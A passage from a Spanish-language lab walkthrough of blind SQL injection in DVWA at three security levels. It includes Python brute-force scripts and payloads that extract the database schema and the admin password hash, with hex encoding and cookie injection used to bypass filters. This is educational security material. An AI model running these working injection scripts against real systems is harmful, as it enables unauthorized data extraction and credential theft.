`for position in range(1,51):`

Ahora toca modificar la consulta de la variable url, esta consulta es la que mostré anteriormente pero adaptada a python:

```py
url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(column_name,%d,1)+FROM+information_schema.columns+WHERE+table_schema+=+'dvwa'+AND+table_name+=+'users'+limit+1)='%s'+--+-&Submit=Submit" % (position, character)
```

Después ejecutaremos el script y veremos lo siguiente:

![userid](/assets/images/DVWA-SQLi/SQLiBlind-easy/userid.png)

Podemos ver que nos enumeró el nombre de la primera columna, pero como no hay límite de caracteres el script sigue corriendo sin saber que ya no hay más posiciones que enumerar, pero simplemente si vemos que el script ya no avanza después de un rato podremos detenerlo con ctrl + c y así nos ahorraríamos hacer lo de obtener la longitud de cada columna, ya que puede ser un poco tedioso.

Así que haremos esto con las columnas restantes, jugando con cambiar el limit en cada ejecución del script, y las consultas quedarían así:

```py
url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(column_name,%d,1)+FROM+information_schema.columns+WHERE+table_schema+=+'dvwa'+AND+table_name+=+'users'+limit+1)='%s'+--+-&Submit=Submit" % (position, character)
```

```py
url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(column_name,%d,1)+FROM+information_schema.columns+WHERE+table_schema+=+'dvwa'+AND+table_name+=+'users'+limit+2,1)='%s'+--+-&Submit=Submit" % (position, character)
```

```py
url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(column_name,%d,1)+FROM+information_schema.columns+WHERE+table_schema+=+'dvwa'+AND+table_name+=+'users'3,1)='%s'+--+-&Submit=Submit" % (position, character)
```

Etc...

Una vez enumeradas todas los nombres de cada columna:

- user_id
- first_name
- last_name
- user
- password
- avatar
- last_login
- failed_login

Ya solo nos queda dumpear los datos de las columnas que nos interesan, en este caso es "user" y "password".

Empezaremos por hacer la consulta para enumerar el usuario del primer registro:

`1' AND (SELECT SUBSTRING(user,1,1) FROM dvwa.users LIMIT 1)='a' -- -`

Como recordamos en esta consulta estamos obteniendo el valor del primer digito del nombre de usuario y lo estamos comparando con el valor "a".

![a](/assets/images/DVWA-SQLi/SQLiBlind-easy/digitA.png)

Podemos apreciar que nos respondió el valor True, por lo que podemos saber que el nombre del primer usuario empieza con "a".

Y para verificar que todo esté teniendo lógica pondremos la misma consulta, pero con un valor que no sea "a", y nos debería de dar el resultado False para comprobar que nos está interpretando correctamente las consultas y no caer en falsos positivos:

`1' AND (SELECT SUBSTRING(user,1,1) FROM dvwa.users LIMIT 1)='b' -- -`

Y nos responde:

![b](/assets/images/DVWA-SQLi/SQLiBlind-easy/digitB.png)

Por lo que podemos saber que esta consulta si nos está interpretando correctamente todo, por lo que sabemos que empieza con "a".

Ahora que ya descubrimos la consulta correcta lo que haremos es agregar al script esta consulta para facilitar la enumeración de caracteres del primer usuario.

Y las modificaciones del script ahora serán las siguientes:

Como no sacamos la longitud del primer usuario pondremos un rango alto y detendremos el script cuando leamos que el usuario ya no avanza, por lo que el for quedaría así:

`for position in range(1,51):`

Y la consulta de la variable URL quedará:

```py
url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(user,%d,1)+FROM+dvwa.users+LIMIT+1)='%s'+--+-&Submit=Submit" % (position, character)
```

Es la misma que la anterior, pero como ya sabemos esta adaptada para python, url-encodeada y con los valores que irán fuzzeando cada petición.

Después de estos cambios lo ejecutaremos y veremos que nos enumera el primer usuario:

![admin](/assets/images/DVWA-SQLi/SQLiBlind-easy/admin.png)

Podemos apreciar que al ejecutar el script el primer nombre de usuario que dumpeamos fue el de admin, por lo que ya encontramos el usuario que más nos interesa, así que si quieres puedes enumerar los usuarios que siguen como ya sabemos cambiando el limit en el script y así obtener uno por uno, pero en este caso no lo haremos, ya que hemos encontrado el importante.

Ahora como recordamos también había otra columna llamada "password" que nos llamaba la atención, así que simplemente haremos la consulta para enumerar la contraseña del usuario admin:

`1' AND (SELECT SUBSTRING(password,1,1) FROM dvwa.users WHERE user = 'admin' LIMIT 1)='a' -- -`

Así que verificamos que funcione la lógica de la consulta primero en BurpSuite y como funciono, ya que descubrimos que el primer carácter es 5, ya que nos devolvió True, entonces ya sabemos que nos interpreta correctamente todo, ya que al poner algún valor diferente a 5 nos devolvía False, por lo que ya esta lista la consulta para adaptarla al script:

`for position in range(1,51):`

Esto ya sabemos que es porque no sacamos la longitud y no sabemos donde parara de recorrerse por lo que le damos un valor alto.

```py
url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(password,%d,1)+FROM+dvwa.users+WHERE+user+=+'admin'+limit+0,1)='%s'+--+-&Submit=Submit" % (position, character)
```

Esta consulta sabemos que es la misma que la anterior pero adaptada a python con sus valores a fuzzear en cada petición.

Y al ejecutar el script como podemos ver tendremos la password del usuario admin:

![password](/assets/images/DVWA-SQLi/SQLiBlind-easy/password.png)

Y ya hemos terminado el nivel Fácil de inyección SQL Blind.

<br>

<div id='id5' />

# Inyección SQL Blind (ciega) - Nivel Intermedio

En este nivel vemos lo siguiente:

![lista](/assets/images/DVWA-SQLi/SQLiBlind-medium/lista.png)

Podemos apreciar que ahora no hay un recuadro para ingresar texto, pero si una lista del cual podemos seleccionar algo y posteriormente tramitar la petición con el dato elegido.

Podemos ver que se tramita por el método POST y no GET, por lo que tendremos que interceptar la petición con BurpSuite para poder ver como se tramita la petición:

![peticion](/assets/images/DVWA-SQLi/SQLiBlind-medium/peticion.png)

Podemos apreciar que nos muestra el id con el valor 1, y nos responde que existe dicho usuario con id con el mensaje que tomaremos como True "User ID exists in the database.".

Como sabemos en este caso solo existen 5 id válidos, por lo que pondremos uno mayor por ejemplo 10 y sabemos que nos responderá el valor False "User ID is MISSING from the database.":

![id10](/assets/images/DVWA-SQLi/SQLiBlind-medium/id10.png)

Como vemos nos responde que ese ID no existe.

Ahora con un ID que nos devuelva verdadero en este caso 1, haremos lo siguiente:

`id=1 AND (1=1) -- -`

Lo que hicimos aquí primero fue agregar el parámetro AND, sin la comilla, ya que no estamos obteniendo el valor directamente que lo escribimos en un cuadro de texto, solamente lo seleccionamos por lo que por detrás no hay alguna comilla que obtenga ese valor de un cuadro de texto, ya que no lo hay por lo que se pasa directamente, y le inyectamos un valor verdadero, en este caso decirle que si 1 es igual a 1.

Y lo tramitamos desde BurpSuite como sabemos Url-encodeado, y veremos que nos responde lo siguiente:

![sqli](/assets/images/DVWA-SQLi/SQLiBlind-medium/sqli.png)

Vemos que nos responde el valor True: "User ID exists in the database."

Ahora averiguaremos si nos está interpretando la consulta, ya que haremos la misma petición, pero esta vez en la consulta inyectada agregaremos algo que nos debería de dar false:

`id=1 AND (2=1) -- -`

Y podemos ver que nos responde con el mensaje False:

![false](/assets/images/DVWA-SQLi/SQLiBlind-medium/false.png)

Podemos apreciar que tiene lógica, por lo que sabemos que nos está interpretando nuestras consultas inyectadas, como el valor del AND es false nos respondió: "User ID is MISSING from the database.".

<br>

Una vez identificada la vulnerabilidad procederemos a hacer el proceso que ya sabemos, como es ciega primero trataremos de enumerar el nombre de la base de datos actual.

A partir de aquí ya no mostraremos sobre saber la longitud de cada cosa, ya que nos gasta tiempo en algo que ya sabemos hacer y no es necesario volver a explicar.

Así que directamente iremos a enumerar el nombre de la base de datos en uso, para ello usamos una consulta para jugar con cada posición del nombre de la base de datos, e ir descubriendo cada carácter, para ello usaremos una consulta como esta:

`1 AND (SELECT SUBSTRING(database(),1,1))='a' -- -`

Esta consulta nos debería de funcionar, pero al tratar de ponerla desde BurpSuite vemos que ningún valor nos está interpretando la consulta, y después de intentar varias maneras seguía sin funcionar.

Por lo que tal vez por detrás se esté usando la función: mysql_real_escape_string().

Y descubrimos que esta función como en un anterior nivel descubrimos que hacía que nos invalidara caracteres como comillas dobles, simples, y algunos otros símbolos que son para evitar inyecciones SQL, ya que para una inyección se ocupan esos caracteres.

Pero como en el nivel medio en las instrucciones nos dice que está mal adaptada la función, por lo que podemos escapar de ella convirtiendo lo que está dentro de las comillas a hexadecimal.

Quedando la consulta anterior a algo así:

`1 AND (SELECT SUBSTRING(database(),1,1))=0x61 -- -`

El valor 61 es la letra "a" en hexadecimal.

Por lo que al intentar de esta forma descubrimos que el carácter "d", era el primer valor del nombre de la base de datos:

`1 AND (SELECT SUBSTRING(database(),1,1))=0x64 -- -`

![64](/assets/images/DVWA-SQLi/SQLiBlind-medium/64.png)

Ahora como ya nos dimos cuenta de que nos está interpretando correctamente la consulta, simplemente queda automatizar el resto de caracteres usando un script.

Usamos el script que hemos usado en todo el post pero obviamente cambiando ciertos parámetros quedando así:

```py
#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#CTRL+C
signal.signal(signal.SIGINT, def_handler)

main_url = "http://localhost/DVWA/vulnerabilities/sqli_blind/"
characters = string.ascii_lowercase + string.digits + "-_:@!$%&()*+/;<=>?[\]^{|}.~"

def makeRequest():
    
    database = ""

    p1 = log.progress("Enumerar base de datos")
    p1.status("Iniciando ataque de fuerza bruta para enumerar el nombre de la base de datos actual")

    time.sleep(2)

    p2 = log.progress("database name")

    cookies = {
            'PHPSESSID': "665toq56i3mfultm4gdbktb2os",
            'security': "medium"
            }

    header = {'Content-Type': "application/x-www-form-urlencoded"}

    for position in range(1,51):

        for character in characters:

            hexadecimal = hex(ord(character))

            data_post = {
                    'id': "1 AND (SELECT SUBSTRING(database(),%d,1))=%s -- -" % (position, hexadecimal),
                    'Submit': "Submit"
                    }
            
            p1.status(data_post['id'])

            r = requests.post(main_url, data=data_post, cookies=cookies, headers=header)

            if "User ID exists in the database." in r.text:
                database += character
                p2.status(database)
                break

if __name__ == '__main__':

    makeRequest()
```

En este código vemos que han cambiado varias cosas a comparación de los anteriores, en el caso de esta inyección no fue por el método GET, que se podía explotar por medio de la url y simplemente modificar ese valor para adaptarlo al script, pero como no fue por el método GET, sino por el POST, algunas cosas son distintas.

Primero tenemos los valores de las cookies:

```py
cookies = {
	'PHPSESSID': "665toq56i3mfultm4gdbktb2os",
	'security': "medium"
}
```

Vemos que agregamos las llaves **PHPSESSID** y **security**, con sus valores, sabemos que son cookies, ya que al interceptar la petición nos dice Cookies: seguido de esos valores.

El siguiente valor agregado es la cabecera:

```py
header = {'Content-Type': "application/x-www-form-urlencoded"}
```

Podemos apreciar que el valor es el que nos da burp, que significa que esta petición están codificados en formato url-encode, esto quiere decir que los parámetros y valores se concatenan mediante el símbolo "&", y los espacios son reemplazados por un "+" o "%20" entre otros valores que se modifican automáticamente.

Para este caso que se usan valores alfanuméricos podemos usar ese content-type, pero en caso de que los datos tramitados sean binarios se puede usar otro tipo de content-type como "multipart/form-data" entre otros.

Después dentro de los for anidados que ya conocemos su función vemos que agregamos esto:

```py
hexadecimal = hex(ord(character))
```

Lo que hace la función ord() es tomar el valor ASCII del valor que le pasas, en este caso tomara el valor ASCII de la variable "character", para después ese resultado lo tome la función hex() y convierta dicho valor a formato hexadecimal, en resumen estas funciones hacen que te conviertan un valor a ese valor en hexadecimal.

> Hacemos esto ya que como recordamos debemos bypassear la función que nos prohíbe usar comillas.

Lo que sigue es asignar la data que está pidiendo el formulario de la web, como podemos apreciar:

```py
data_post = {
	'id': "1 AND (SELECT SUBSTRING(database(),%d,1))=%s -- -" % (position, hexadecimal),
	'Submit': "Submit"
}
```

Le estamos pasando la llave **id**, con el valor que en este caso es la inyección. Seguido de los valores que se irán reemplazando con python.

Y la siguiente llave es **Submit**, la cual tiene el valor que vemos en el "diccionario".

> En este caso ya no ponemos nuestro url-encodeado manual ya que esto lo hará python automaticamente y poder evitar errores.

Ya por último tramitamos la petición actual con sus valores actuales:

```py
r = requests.post(main_url, data=data_post, cookies=cookies, headers=header)
```

En este caso hacemos la petición por el método POST, pasamos la url a la que se hará la petición, la data que son los valores llave con su valor de los formularios, y por último pasamos las cookies y la cabecera.

<br>

Una vez ejecutemos el script veremos que nos enumera el nombre de la base de datos actual:

![dvwa](/assets/images/DVWA-SQLi/SQLiBlind-medium/dvwa.png)

Podemos apreciar que la base de datos se llama "dvwa".

<br>

Ahora lo que sigue es listar las tablas de dicha base de datos.

Para ello usaremos el mismo script, solo cambiamos el payload o sea la consulta:

`1 AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema=0x64767761 limit 1)=0x61 -- -`

Con esta consulta la vamos a adaptar al script:

```py
data_post = {
    'id': "1 AND (SELECT SUBSTRING(table_name,%d,1) FROM information_schema.tables WHERE table_schema=0x64767761 limit 1)=%s -- -" % (position, hexadecimal),

    'Submit': "Submit"
    }
```
Podemos apreciar que esta única línea fue la que cambio del script, y al ejecutarlo veremos el nombre de la primera tabla:

![table](/assets/images/DVWA-SQLi/SQLiBlind-medium/tablename.png)

Podemos apreciar que el nombre de la primera tabla es **users**.

Obtendremos las siguientes tablas jugando con el limit en las siguientes ejecuciones del script y descubrimos que las tablas que hay son:

- users
- guestbook

Obviamente nos interesa la tabla **users**.

<br>

Ahora enumeraremos las columnas de la tabla users con la siguiente consulta que pondremos en el script:

`1 AND (SELECT SUBSTRING(column_name,1,1) FROM information_schema.columns WHERE table_schema = 0x64767761 AND table_name = 0x7573657273 limit 1)=0x61 -- -`

Y adaptada al script:

```py
data_post = {
    'id': "1 AND (SELECT SUBSTRING(column_name,%d,1) FROM information_schema.columns WHERE table_schema = 0x64767761 AND table_name = 0x7573657273 limit 1)=%s -- -" % (position, hexadecimal),

    'Submit': "Submit"
    }
```

Ahora al ejecutar el script veremos el primer nombre de la columna de la tabla users:

![column](/assets/images/DVWA-SQLi/SQLiBlind-medium/columnname.png)

Y nuevamente jugando con el limit enumeraremos el resto de columnas, en este caso encontramos las siguientes:

- user_id
- first_name
- last_name
- user
- password
- avatar
- last_login
- failed_login

<br>

Y por último solo nos queda enumerar los datos de cada columna, empezando por usuarios, así que nuestra consulta quedará así:

`1 AND (SELECT SUBSTRING(user,1,1) FROM dvwa.users limit 1)=0x61`

Y adaptado al script se vería:

```py
data_post = {
    'id': "1 AND (SELECT SUBSTRING(user,%d,1) FROM dvwa.users limit 1)=%s" % (position, hexadecimal),

    'Submit': "Submit"
    }
```

Y nos responderá:

![user](/assets/images/DVWA-SQLi/SQLiBlind-medium/username.png)

Y vemos que nos dice que el primer usuario es **admin**.

Como este usuario es el que nos interesa simplemente haremos la consulta para enumerar su password:

`1 AND (SELECT SUBSTRING(password,1,1) FROM dvwa.users WHERE user=0x61646d696e limit 1)=0x61`

Y adaptada al script quedaría así:

```py
data_post = {
    'id': "1 AND (SELECT SUBSTRING(password,%d,1) FROM dvwa.users WHERE user=0x61646d696e limit 1)=%s" % (position, hexadecimal),

    'Submit': "Submit"
    }
```

Y podremos ver que nos responde lo siguiente:

![passwordadmin](/assets/images/DVWA-SQLi/SQLiBlind-medium/passwordadmin.png)

Por lo que ya tenemos la password del usuario admin: **5f4dcc3b5aa765d61d8327deb882cf99**.

Y con esto hemos terminado el nivel Medio.

<br>

<div id='id6' />

# Inyección SQL Blind (ciega) - Nivel Dificíl

En este último nivel, al acceder al laboratorio vemos lo siguiente:

![hard](/assets/images/DVWA-SQLi/SQLiBlind-hard/hard.png)

Podemos apreciar que esta vez no hay algún formulario, o algo para elegir el id, pero podemos ver que nos dice que si damos click nos abrirá otra ventana y desde ahí podremos agregar el id.

Así que al dar click veremos lo siguiente:

![cookie](/assets/images/DVWA-SQLi/SQLiBlind-hard/cookieid.png)

Vemos que nos abre la ventana para poder cambiar nuestro ID.

Agregaremos un valor, en este caso 1:

![idset](/assets/images/DVWA-SQLi/SQLiBlind-hard/idset.png)

Y podemos apreciar que nos ha agregado la cookie en este caso del ID 1, y en la ventana principal podemos ver que nos devuelve el mensaje True: "User ID exists in the database.".

Ahora pondremos un valor inexistente como el 10, para comprobar que haya 2 estados de respuesta:

![missing](/assets/images/DVWA-SQLi/SQLiBlind-hard/missing.png)

Podemos apreciar que nos da el mensaje False: "User ID is MISSING from the database.".

<br>

Así que una vez le hayamos dado un ID, que nos quedaremos con el 1 nuevamente, una vez establecido el ID 1, lo que haremos será interceptar la petición principal, viendo lo siguiente:

![peticion](/assets/images/DVWA-SQLi/SQLiBlind-hard/peticion.png)

Podemos apreciar que en el valor de la cookie hay un valor llamado "id", el cual contiene el ID 1 que asignamos anteriormente en la segunda ventana.

Ahora intentaremos inyectar nuestra primera consulta en el campo de id:

`1' AND (1=1) -- -`

> Recuerda que en este caso se usa la comilla simple para escapar de la consulta por defecto, e inyectar las nuestras, y la comilla que se recorre la comentamos.

Vemos que esto nos responde:

![true](/assets/images/DVWA-SQLi/SQLiBlind-hard/true.png)

Podemos apreciar que nos devuelve el mensaje del valor True.

Para saber si nos está interpretando correctamente las consultas, como ya hemos hecho le daremos un valor que nos devuelva un mensaje de False:

`1' AND (2=1) -- -`

![false](/assets/images/DVWA-SQLi/SQLiBlind-hard/false.png)

Y podemos ver que nos responde el mensaje que indica un False.

Por lo que ya sabemos que es vulnerable, y procederemos a enumerar el nombre de la base de datos con la siguiente consulta:

`1' AND (SELECT SUBSTRING(database(),1,1))='a' -- -`

Y esta consulta la adaptaremos a nuestro script ya conocido, cambiando obviamente algunas cosas:

```py

#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#CTRL+C
signal.signal(signal.SIGINT, def_handler)

main_url = "http://localhost/DVWA/vulnerabilities/sqli_blind/"
characters = string.ascii_lowercase + string.digits + "-_:@!$%&()*+/;<=>?[\]^{|}.~"

def makeRequest():
    
    database = ""

    p1 = log.progress("Enumerar base de datos")
    p1.status("Iniciando ataque de fuerza bruta para enumerar el nombre de la base de datos actual")

    time.sleep(2)

    p2 = log.progress("database name")

    for position in range(1,51):

        for character in characters:

            cookies = {
                    'id': "1' AND (SELECT SUBSTRING(database(),%d,1))='%s' -- -" % (position, character),
                    'PHPSESSID': "665toq56i3mfultm4gdbktb2os",
                    'security': "high"
                    }
            
            p1.status(cookies['id'])

            r = requests.get(main_url, cookies=cookies)

            if "User ID exists in the database." in r.text:
                database += character
                p2.status(database)
                break

if __name__ == '__main__':

    makeRequest()

```

Lo que hicimos fue eliminar los diccionarios que solo ocupábamos en peticiones POST, pero esta al ser GET, y la vulnerabilidad está en las cookies cambiamos esos valores así:

```py

cookies = {
	'id': "1' AND (SELECT SUBSTRING(database(),%d,1))='%s' -- -" % (position, character),
	'PHPSESSID': "665toq56i3mfultm4gdbktb2os",
	'security': "high"
	}

```

Podemos apreciar que hemos agregado la consulta adaptada a python para fuzzear las posiciones, seguido de los demás valores de la cookie.

Y en esta línea tramitamos y guardamos el resultado de la petición por el método GET, usando las cookies que asignamos.

```py
r = requests.get(main_url, cookies=cookies)
```

En este nivel no es necesario usar lo de hexadecimal, ya que al parecer no se está usando ese filtro.

Al ejecutar el script veremos el nombre de la base de datos:

![database](/assets/images/DVWA-SQLi/SQLiBlind-hard/database.png)

Podemos ver que el nombre es "dvwa".

Después crearemos una consulta que obtenga las tablas de esa base de datos:

`1' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema='dvwa' limit 1)='a' -- -`

Y la adaptamos al script:

```py

cookies = {
	'id': "1' AND (SELECT SUBSTRING(table_name,%d,1) FROM information_schema.tables WHERE table_schema='dvwa' limit 1)='%s' -- -" % (position, character),
	'PHPSESSID': "665toq56i3mfultm4gdbktb2os",
	'security': "high"
	}

```

Y vemos que nos responde el nombre de la primera tabla:

![tablename](/assets/images/DVWA-SQLi/SQLiBlind-hard/tablename.png)

Y también la segunda:

![guestbook](/assets/images/DVWA-SQLi/SQLiBlind-hard/guestbook.png)

<br>

Ahora enumeraremos las columnas de la tabla users, quedando así la consulta que usaremos:

`1' AND (SELECT SUBSTRING(column_name,1,1) FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users' limit 1)='a' -- -`

Y la adaptaremos al script:

```py

cookies = {
	'id': "1' AND (SELECT SUBSTRING(column_name,%d,1) FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users' limit 1)='%s' -- -" % (position, character),
	'PHPSESSID': "665toq56i3mfultm4gdbktb2os",
	'security': "high"
	}

```

Y vemos que al ejecutarla nos da la columna user_id:

![user_id](/assets/images/DVWA-SQLi/SQLiBlind-hard/user_id.png)

Y jugando con el limit descubrimos las columnas:

- user_id
- first_name
- last_name
- user
- password
- avatar
- last_login
- failed_login

Por lo que nos interesa enumerar el contenido de las columnas **user** y **password**, como ya hicimos en niveles anteriores, vamos a dumpear estos datos.

Para ello usamos la siguiente consulta:

`1' AND (SELECT SUBSTRING(user,1,1) FROM dvwa.users limit 1)='a'`

Y la adaptaremos al script:

```py

cookies = {
	'id': "1' AND (SELECT SUBSTRING(user,%d,1) FROM dvwa.users limit 1)='%s'" % (position, character),
	'PHPSESSID': "665toq56i3mfultm4gdbktb2os",
	'security': "high"
	}

```

Y veremos que el primer registro usuario es:

![admin](/assets/images/DVWA-SQLi/SQLiBlind-hard/admin.png)

Podemos ver que es **admin**.

Ahora enumeraremos la password de ese usuario:

`1' AND (SELECT SUBSTRING(password,1,1) FROM dvwa.users WHERE user='admin' limit 1)='a'`

Y la adaptaremos al script:

```py

cookies = {
	'id': "1' AND (SELECT SUBSTRING(password,%d,1) FROM dvwa.users WHERE user='admin' limit 1)='%s'" % (position, character),
	'PHPSESSID': "665toq56i3mfultm4gdbktb2os",
	'security': "high"
	}

```

Y vemos que nos responde:

![password](/assets/images/DVWA-SQLi/SQLiBlind-hard/password.png)

Y ya tendremos la password del usuario admin y hemos acabado con todos los niveles SQLi y SQL Blind de DVWA.
